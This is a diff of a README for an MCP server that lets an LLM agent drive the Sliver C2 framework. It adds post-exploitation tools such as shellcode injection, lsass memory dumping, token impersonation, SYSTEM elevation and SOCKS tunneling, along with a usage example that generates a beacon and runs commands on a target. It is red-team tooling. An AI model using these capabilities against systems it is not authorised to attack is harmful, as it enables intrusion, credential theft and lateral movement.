@@ -20,7 +20,7 @@ surface — listeners, implant/beacon generation, sessions and beacons, command 
 operations, and a structured handoff — as `mcp__sliver__*` tools an LLM agent can drive.
 
 It is the **C2 layer of the AI-offsec stack**, built to slot in alongside the
-[p0rtix](https://github.com/v0idravl/p0rtix) (recon) and Metasploit (exploitation) MCP servers
+[p0rtix](https://github.com/v0idravl/p0rtix) (recon) and p0cs (exploit staging and delivery) MCP servers
 and orchestrated by the [dagar-red](https://github.com/v0idravl/dagar-red) skill system. It
 mirrors their conventions: Python + FastMCP, async tools, structured-dict returns, and a
 noise / `arm_dangerous` safety gate.
@@ -93,6 +93,12 @@ a live client return a structured "not connected" error until it succeeds.
 | File operations | `ls`, `pwd`, `cd`, `mkdir`, `download`, `upload`, `rm` | navigate and move files on the target |
 | Pivots | `list_pivots` | enumerate pivot listeners on a session |
 | Handoff | `export_handoff`, `ingest_handoff` | exchange C2 state with the rest of the stack |
+| Post-exploitation | `execute_assembly`, `execute_shellcode`, `ps`, `process_dump`, `screenshot`, `ifconfig`, `netstat` | run .NET assemblies in-memory (SharpHound, Rubeus, Seatbelt, etc.), inject shellcode into a process, enumerate processes, dump process memory (lsass), capture desktop screenshots, list network interfaces and active connections |
+| Token operations | `make_token`, `impersonate`, `revert_to_self`, `run_as`, `migrate` | create a token with supplied credentials, impersonate a token by PID, drop impersonation, run a command as another user, migrate implant to another process |
+| Registry | `registry_read`, `registry_write` | read and write registry key values |
+| Elevated | `get_system` | attempt SYSTEM elevation (requires `arm_dangerous`) |
+| SOCKS / Tunneling | `start_socks`, `stop_socks`, `start_portfwd`, `stop_portfwd`, `list_tunnels` | SOCKS5 proxy via a session (auto-writes `~/.cache/dagar-proxychains.conf` so p0rtix nmap tunnels through), port forwards, list active proxies and port forwards |
+| Engagement state | `open_store`, `export_state` | open/create a dagar-state SQLite engagement store; export current store as JSON |
 | Safety | `set_noise`, `arm_dangerous` | raise the noise ceiling / unlock destructive actions |
 
 ---
@@ -125,6 +131,7 @@ generate_beacon(c2_host="<redirector>", os="windows", interval=60, jitter=30)
 poll_events()            # watch for the callback
 list_sessions()
 execute_command(target_id, "whoami")
+start_socks(session_id, 1080)  # auto-writes proxychains.conf → p0rtix nmap tunnels through
 export_handoff()         # feed C2 state back to internal-dispatch
 ```
 
@@ -140,17 +147,21 @@ For a beacon, if the next check-in does not arrive within `SLIVER_TASK_TIMEOUT` 
 timing) or `task_state="dead"` (the beacon is gone). Poll `get_beacon_tasks(beacon_id)` to see
 whether a queued task has since been picked up.
 
+### dagar-state integration
+
+When `open_store(engagement)` is called, sliver-mcp tracks sessions, routes, and privilege
+escalations in a shared SQLite DB that p0rtix also writes to — so the full engagement picture
+(hosts, services, creds, sessions) is queryable in one place.
+
 ---
 
 ## ⚠️ Known limitations (v1)
 
 These reflect the current sliver-py surface, not the design:
 
-- **No client-side SOCKS / port-forward tunnels.** sliver-py does not implement the tunnel
-  streaming, so only `list_pivots` is exposed. Use the Sliver console for `socks`/`portfwd`.
 - **No interactive PTY shell.** A streaming PTY can't be a single request/response tool;
   `execute_command` covers command execution.
-- **No `cp` / `chmod` / `chown` and no loot/creds store** — not in sliver-py's base command set.
+- **No `cp` / `chmod` / `chown`** — not in sliver-py's base command set.
   Planned once upstream exposes them.
 
 ---
@@ -163,7 +174,6 @@ These reflect the current sliver-py surface, not the design:
 | `connect()` fails | Check `SLIVER_CONFIG` points at a valid operator `.cfg`, and that the team server is reachable (host/port in the config). See [`docs/live-test.md`](docs/live-test.md). |
 | A call is "refused: above noise ceiling" | Raise it deliberately: `set_noise("yellow")` for target-touching actions, `arm_dangerous()` for `rm`. |
 | No callback after delivery | `poll_events()` drains the async queue; beacons only report on the next `interval` ± `jitter` check-in. |
-| Need SOCKS / portfwd | Not exposed (see limitations) — use the Sliver console for now. |
 
 ---
 
